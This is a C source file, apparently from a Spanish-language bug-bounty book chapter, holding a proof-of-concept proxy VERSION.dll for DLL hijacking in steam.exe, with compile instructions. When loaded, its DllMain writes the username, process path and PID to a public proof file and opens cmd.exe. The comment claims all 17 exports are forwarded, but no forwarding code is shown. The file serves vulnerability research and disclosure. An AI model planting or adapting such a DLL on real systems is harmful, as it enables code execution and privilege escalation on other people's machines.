// Extraído de: LibroBugBounty/cap-21-caso-steam.md
/**
 * Proxy VERSION.dll para DLL hijacking en steam.exe
 * Reenvia los 17 exports a la DLL real del sistema.
 * Ejecuta payload en DllMain (hilo separado).
 *
 * Compilar: gcc -shared -m32 -o VERSION.dll steam_poc.c
 *           -lkernel32 -ladvapi32
 */
#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason,
                      LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        /* Escribir prueba de ejecucion */
        HANDLE hFile = CreateFileA(
            "C:\\Users\\Public\\steam_lpe_proof.txt",
            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile != INVALID_HANDLE_VALUE) {
            char username[256] = {0};
            DWORD size = 256;
            GetUserNameA(username, &size);

            char procname[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, procname, MAX_PATH);

            char buf[1024];
            int len = sprintf(buf,
                "=== Steam DLL Hijack Proof ===\r\n"
                "Running as: %s\r\n"
                "Process: %s\r\n"
                "PID: %lu\r\n"
                "DLL: VERSION.dll (proxy)\r\n"
                "Loaded by steam.exe!\r\n",
                username, procname, GetCurrentProcessId());

            DWORD written;
            WriteFile(hFile, buf, len, &written, NULL);
            CloseHandle(hFile);
        }
        /* Prueba visual */
        WinExec("cmd.exe", SW_SHOW);
    }
    return TRUE;
}
